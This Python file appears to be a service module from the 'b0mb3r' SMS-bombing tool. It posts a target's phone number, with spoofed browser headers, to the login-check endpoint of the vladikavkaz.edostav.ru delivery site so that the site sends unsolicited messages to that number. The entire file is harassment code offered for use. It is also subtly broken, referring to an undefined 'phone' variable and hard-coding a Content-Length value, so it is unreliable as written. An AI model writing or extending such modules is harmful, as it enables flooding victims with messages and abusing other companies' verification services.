from b0mb3r.services.service import Service


class Vladikavkaz(Service):
    async def run(self):
        await self.post(
            "https://vladikavkaz.edostav.ru/site/CheckAuthLogin",
            data={"phone_or_email":phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US, en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"},
        )
